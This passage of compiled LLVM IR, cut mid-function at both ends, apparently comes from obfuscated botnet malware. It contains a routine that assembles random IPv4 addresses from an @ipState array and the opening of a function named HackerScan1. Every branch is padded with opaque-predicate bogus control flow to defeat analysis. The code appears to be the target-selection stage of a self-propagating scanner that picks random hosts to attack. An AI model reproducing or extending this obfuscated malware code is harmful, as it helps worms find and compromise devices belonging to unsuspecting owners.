  %627 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %628 = zext i8 %627 to i32
  %629 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %630 = zext i8 %629 to i32
  %631 = call i32 (i8*, i8*, ...) @szprintf(i8* %626, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.667, i32 0, i32 0), i32 %628, i32 %630)
  %632 = load i32, i32* @x.63
  %633 = load i32, i32* @y.64
  %634 = sub i32 %632, 1
  %635 = mul i32 %632, %634
  %636 = urem i32 %635, 2
  %637 = icmp eq i32 %636, 0
  %638 = icmp slt i32 %633, 10
  %639 = or i1 %637, %638
  br i1 %639, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %640

; <label>:640:                                    ; preds = %originalBBpart272, %originalBBpart268
  %641 = load i32, i32* %1, align 4
  %642 = icmp eq i32 %641, 32
  br i1 %642, label %643, label %650

; <label>:643:                                    ; preds = %640
  %644 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %645 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %646 = zext i8 %645 to i32
  %647 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %648 = zext i8 %647 to i32
  %649 = call i32 (i8*, i8*, ...) @szprintf(i8* %644, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.668, i32 0, i32 0), i32 %646, i32 %648)
  br label %650

; <label>:650:                                    ; preds = %643, %640
  %651 = load i32, i32* %1, align 4
  %652 = icmp eq i32 %651, 33
  br i1 %652, label %653, label %676

; <label>:653:                                    ; preds = %650
  %654 = load i32, i32* @x.63
  %655 = load i32, i32* @y.64
  %656 = sub i32 %654, 1
  %657 = mul i32 %654, %656
  %658 = urem i32 %657, 2
  %659 = icmp eq i32 %658, 0
  %660 = icmp slt i32 %655, 10
  %661 = or i1 %659, %660
  br i1 %661, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %653
  %662 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %663 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %664 = zext i8 %663 to i32
  %665 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %666 = zext i8 %665 to i32
  %667 = call i32 (i8*, i8*, ...) @szprintf(i8* %662, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.669, i32 0, i32 0), i32 %664, i32 %666)
  %668 = load i32, i32* @x.63
  %669 = load i32, i32* @y.64
  %670 = sub i32 %668, 1
  %671 = mul i32 %668, %670
  %672 = urem i32 %671, 2
  %673 = icmp eq i32 %672, 0
  %674 = icmp slt i32 %669, 10
  %675 = or i1 %673, %674
  br i1 %675, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %676

; <label>:676:                                    ; preds = %originalBBpart276, %650
  %677 = load i32, i32* %1, align 4
  %678 = icmp eq i32 %677, 34
  br i1 %678, label %679, label %686

; <label>:679:                                    ; preds = %676
  %680 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %681 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %682 = zext i8 %681 to i32
  %683 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %684 = zext i8 %683 to i32
  %685 = call i32 (i8*, i8*, ...) @szprintf(i8* %680, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.670, i32 0, i32 0), i32 %682, i32 %684)
  br label %686

; <label>:686:                                    ; preds = %679, %676
  %687 = load i32, i32* %1, align 4
  %688 = icmp eq i32 %687, 35
  br i1 %688, label %689, label %712

; <label>:689:                                    ; preds = %686
  %690 = load i32, i32* @x.63
  %691 = load i32, i32* @y.64
  %692 = sub i32 %690, 1
  %693 = mul i32 %690, %692
  %694 = urem i32 %693, 2
  %695 = icmp eq i32 %694, 0
  %696 = icmp slt i32 %691, 10
  %697 = or i1 %695, %696
  br i1 %697, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %689
  %698 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %699 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %700 = zext i8 %699 to i32
  %701 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %702 = zext i8 %701 to i32
  %703 = call i32 (i8*, i8*, ...) @szprintf(i8* %698, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.671, i32 0, i32 0), i32 %700, i32 %702)
  %704 = load i32, i32* @x.63
  %705 = load i32, i32* @y.64
  %706 = sub i32 %704, 1
  %707 = mul i32 %704, %706
  %708 = urem i32 %707, 2
  %709 = icmp eq i32 %708, 0
  %710 = icmp slt i32 %705, 10
  %711 = or i1 %709, %710
  br i1 %711, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %712

; <label>:712:                                    ; preds = %originalBBpart280, %686
  %713 = load i32, i32* %1, align 4
  %714 = icmp eq i32 %713, 36
  br i1 %714, label %715, label %722

; <label>:715:                                    ; preds = %712
  %716 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %717 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %718 = zext i8 %717 to i32
  %719 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %720 = zext i8 %719 to i32
  %721 = call i32 (i8*, i8*, ...) @szprintf(i8* %716, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.672, i32 0, i32 0), i32 %718, i32 %720)
  br label %722

; <label>:722:                                    ; preds = %715, %712
  %723 = load i32, i32* %1, align 4
  %724 = icmp eq i32 %723, 37
  br i1 %724, label %725, label %748

; <label>:725:                                    ; preds = %722
  %726 = load i32, i32* @x.63
  %727 = load i32, i32* @y.64
  %728 = sub i32 %726, 1
  %729 = mul i32 %726, %728
  %730 = urem i32 %729, 2
  %731 = icmp eq i32 %730, 0
  %732 = icmp slt i32 %727, 10
  %733 = or i1 %731, %732
  br i1 %733, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %725
  %734 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %735 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %736 = zext i8 %735 to i32
  %737 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %738 = zext i8 %737 to i32
  %739 = call i32 (i8*, i8*, ...) @szprintf(i8* %734, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.673, i32 0, i32 0), i32 %736, i32 %738)
  %740 = load i32, i32* @x.63
  %741 = load i32, i32* @y.64
  %742 = sub i32 %740, 1
  %743 = mul i32 %740, %742
  %744 = urem i32 %743, 2
  %745 = icmp eq i32 %744, 0
  %746 = icmp slt i32 %741, 10
  %747 = or i1 %745, %746
  br i1 %747, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %748

; <label>:748:                                    ; preds = %originalBBpart284, %722
  %749 = load i32, i32* %1, align 4
  %750 = icmp eq i32 %749, 38
  br i1 %750, label %751, label %774

; <label>:751:                                    ; preds = %748
  %752 = load i32, i32* @x.63
  %753 = load i32, i32* @y.64
  %754 = sub i32 %752, 1
  %755 = mul i32 %752, %754
  %756 = urem i32 %755, 2
  %757 = icmp eq i32 %756, 0
  %758 = icmp slt i32 %753, 10
  %759 = or i1 %757, %758
  br i1 %759, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %751
  %760 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %761 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %762 = zext i8 %761 to i32
  %763 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %764 = zext i8 %763 to i32
  %765 = call i32 (i8*, i8*, ...) @szprintf(i8* %760, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.674, i32 0, i32 0), i32 %762, i32 %764)
  %766 = load i32, i32* @x.63
  %767 = load i32, i32* @y.64
  %768 = sub i32 %766, 1
  %769 = mul i32 %766, %768
  %770 = urem i32 %769, 2
  %771 = icmp eq i32 %770, 0
  %772 = icmp slt i32 %767, 10
  %773 = or i1 %771, %772
  br i1 %773, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %774

; <label>:774:                                    ; preds = %originalBBpart288, %748
  %775 = load i32, i32* %1, align 4
  %776 = icmp eq i32 %775, 39
  br i1 %776, label %777, label %800

; <label>:777:                                    ; preds = %774
  %778 = load i32, i32* @x.63
  %779 = load i32, i32* @y.64
  %780 = sub i32 %778, 1
  %781 = mul i32 %778, %780
  %782 = urem i32 %781, 2
  %783 = icmp eq i32 %782, 0
  %784 = icmp slt i32 %779, 10
  %785 = or i1 %783, %784
  br i1 %785, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %777
  %786 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %787 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %788 = zext i8 %787 to i32
  %789 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %790 = zext i8 %789 to i32
  %791 = call i32 (i8*, i8*, ...) @szprintf(i8* %786, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.675, i32 0, i32 0), i32 %788, i32 %790)
  %792 = load i32, i32* @x.63
  %793 = load i32, i32* @y.64
  %794 = sub i32 %792, 1
  %795 = mul i32 %792, %794
  %796 = urem i32 %795, 2
  %797 = icmp eq i32 %796, 0
  %798 = icmp slt i32 %793, 10
  %799 = or i1 %797, %798
  br i1 %799, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %800

; <label>:800:                                    ; preds = %originalBBpart292, %774
  %801 = load i32, i32* %1, align 4
  %802 = icmp eq i32 %801, 40
  br i1 %802, label %803, label %826

; <label>:803:                                    ; preds = %800
  %804 = load i32, i32* @x.63
  %805 = load i32, i32* @y.64
  %806 = sub i32 %804, 1
  %807 = mul i32 %804, %806
  %808 = urem i32 %807, 2
  %809 = icmp eq i32 %808, 0
  %810 = icmp slt i32 %805, 10
  %811 = or i1 %809, %810
  br i1 %811, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %803
  %812 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %813 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %814 = zext i8 %813 to i32
  %815 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %816 = zext i8 %815 to i32
  %817 = call i32 (i8*, i8*, ...) @szprintf(i8* %812, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.676, i32 0, i32 0), i32 %814, i32 %816)
  %818 = load i32, i32* @x.63
  %819 = load i32, i32* @y.64
  %820 = sub i32 %818, 1
  %821 = mul i32 %818, %820
  %822 = urem i32 %821, 2
  %823 = icmp eq i32 %822, 0
  %824 = icmp slt i32 %819, 10
  %825 = or i1 %823, %824
  br i1 %825, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %826

; <label>:826:                                    ; preds = %originalBBpart296, %800
  %827 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %828 = call i32 @inet_addr(i8* %827) #5
  ret i32 %828

originalBBalteredBB:                              ; preds = %originalBB, %39
  %829 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %830 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %831 = zext i8 %830 to i32
  %832 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %833 = zext i8 %832 to i32
  %834 = call i32 (i8*, i8*, ...) @szprintf(i8* %829, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.643, i32 0, i32 0), i32 %831, i32 %833)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  %835 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %836 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %837 = zext i8 %836 to i32
  %838 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %839 = zext i8 %838 to i32
  %840 = call i32 (i8*, i8*, ...) @szprintf(i8* %835, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.644, i32 0, i32 0), i32 %837, i32 %839)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  %841 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %842 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %843 = zext i8 %842 to i32
  %844 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %845 = zext i8 %844 to i32
  %846 = call i32 (i8*, i8*, ...) @szprintf(i8* %841, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.645, i32 0, i32 0), i32 %843, i32 %845)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %127
  %847 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %848 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %849 = zext i8 %848 to i32
  %850 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %851 = zext i8 %850 to i32
  %852 = call i32 (i8*, i8*, ...) @szprintf(i8* %847, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.647, i32 0, i32 0), i32 %849, i32 %851)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %150
  %853 = load i32, i32* %1, align 4
  %854 = icmp eq i32 %853, 7
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %176
  %855 = load i32, i32* %1, align 4
  %856 = icmp eq i32 %855, 8
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %195
  %857 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %858 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %859 = zext i8 %858 to i32
  %860 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %861 = zext i8 %860 to i32
  %862 = call i32 (i8*, i8*, ...) @szprintf(i8* %857, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.649, i32 0, i32 0), i32 %859, i32 %861)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %238
  %863 = load i32, i32* %1, align 4
  %864 = icmp eq i32 %863, 11
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %257
  %865 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %866 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %867 = zext i8 %866 to i32
  %868 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %869 = zext i8 %868 to i32
  %870 = call i32 (i8*, i8*, ...) @szprintf(i8* %865, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.652, i32 0, i32 0), i32 %867, i32 %869)
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %280
  %871 = load i32, i32* %1, align 4
  %872 = icmp eq i32 %871, 12
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %359
  %873 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %874 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %875 = zext i8 %874 to i32
  %876 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %877 = zext i8 %876 to i32
  %878 = call i32 (i8*, i8*, ...) @szprintf(i8* %873, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.643, i32 0, i32 0), i32 %875, i32 %877)
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %392
  %879 = load i32, i32* %1, align 4
  %880 = icmp eq i32 %879, 20
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %421
  %881 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %882 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %883 = zext i8 %882 to i32
  %884 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %885 = zext i8 %884 to i32
  %886 = call i32 (i8*, i8*, ...) @szprintf(i8* %881, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.657, i32 0, i32 0), i32 %883, i32 %885)
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %464
  %887 = load i32, i32* %1, align 4
  %888 = icmp eq i32 %887, 24
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %493
  %889 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %890 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %891 = zext i8 %890 to i32
  %892 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %893 = zext i8 %892 to i32
  %894 = call i32 (i8*, i8*, ...) @szprintf(i8* %889, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.661, i32 0, i32 0), i32 %891, i32 %893)
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %529
  %895 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %896 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %897 = zext i8 %896 to i32
  %898 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %899 = zext i8 %898 to i32
  %900 = call i32 (i8*, i8*, ...) @szprintf(i8* %895, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.663, i32 0, i32 0), i32 %897, i32 %899)
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %565
  %901 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %902 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %903 = zext i8 %902 to i32
  %904 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %905 = zext i8 %904 to i32
  %906 = call i32 (i8*, i8*, ...) @szprintf(i8* %901, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.665, i32 0, i32 0), i32 %903, i32 %905)
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %598
  %907 = load i32, i32* %1, align 4
  %908 = icmp eq i32 %907, 31
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %617
  %909 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %910 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %911 = zext i8 %910 to i32
  %912 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %913 = zext i8 %912 to i32
  %914 = call i32 (i8*, i8*, ...) @szprintf(i8* %909, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.667, i32 0, i32 0), i32 %911, i32 %913)
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %653
  %915 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %916 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %917 = zext i8 %916 to i32
  %918 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %919 = zext i8 %918 to i32
  %920 = call i32 (i8*, i8*, ...) @szprintf(i8* %915, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.669, i32 0, i32 0), i32 %917, i32 %919)
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %689
  %921 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %922 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %923 = zext i8 %922 to i32
  %924 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %925 = zext i8 %924 to i32
  %926 = call i32 (i8*, i8*, ...) @szprintf(i8* %921, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.671, i32 0, i32 0), i32 %923, i32 %925)
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %725
  %927 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %928 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %929 = zext i8 %928 to i32
  %930 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %931 = zext i8 %930 to i32
  %932 = call i32 (i8*, i8*, ...) @szprintf(i8* %927, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.673, i32 0, i32 0), i32 %929, i32 %931)
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %751
  %933 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %934 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %935 = zext i8 %934 to i32
  %936 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %937 = zext i8 %936 to i32
  %938 = call i32 (i8*, i8*, ...) @szprintf(i8* %933, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.674, i32 0, i32 0), i32 %935, i32 %937)
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %777
  %939 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %940 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %941 = zext i8 %940 to i32
  %942 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %943 = zext i8 %942 to i32
  %944 = call i32 (i8*, i8*, ...) @szprintf(i8* %939, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.675, i32 0, i32 0), i32 %941, i32 %943)
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %803
  %945 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %946 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %947 = zext i8 %946 to i32
  %948 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %949 = zext i8 %948 to i32
  %950 = call i32 (i8*, i8*, ...) @szprintf(i8* %945, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.676, i32 0, i32 0), i32 %947, i32 %949)
  br label %originalBB94
}

; Function Attrs: noinline nounwind uwtable
define i32 @HackerScan1() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3 = call i32 @rand() #5
  %4 = srem i32 %3, 223
  %5 = trunc i32 %4 to i8
  store i8 %5, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %6 = call i32 @rand() #5
  %7 = srem i32 %6, 255
  %8 = trunc i32 %7 to i8
  store i8 %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %9 = call i32 @rand() #5
  %10 = srem i32 %9, 255
  %11 = trunc i32 %10 to i8
  store i8 %11, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %12 = call i32 @rand() #5
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %15 = call i32 @rand() #5
  %16 = srem i32 %15, 290
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %26

; <label>:19:                                     ; preds = %0
  %20 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %21 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %22 = zext i8 %21 to i32
  %23 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %24 = zext i8 %23 to i32
  %25 = call i32 (i8*, i8*, ...) @szprintf(i8* %20, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.677, i32 0, i32 0), i32 %22, i32 %24)
  br label %26

; <label>:26:                                     ; preds = %19, %0
  %27 = load i32, i32* @x.65
  %28 = load i32, i32* @y.66
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %26
  %35 = load i32, i32* %1, align 4
  %36 = icmp eq i32 %35, 1
  %37 = load i32, i32* @x.65
  %38 = load i32, i32* @y.66
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %68

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* @x.65
  %47 = load i32, i32* @y.66
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %55 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %56 = zext i8 %55 to i32
  %57 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %58 = zext i8 %57 to i32
  %59 = call i32 (i8*, i8*, ...) @szprintf(i8* %54, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.678, i32 0, i32 0), i32 %56, i32 %58)
  %60 = load i32, i32* @x.65
  %61 = load i32, i32* @y.66
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %68

; <label>:68:                                     ; preds = %originalBBpart24, %originalBBpart2
  %69 = load i32, i32* @x.65
  %70 = load i32, i32* @y.66
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  %77 = load i32, i32* %1, align 4
  %78 = icmp eq i32 %77, 2
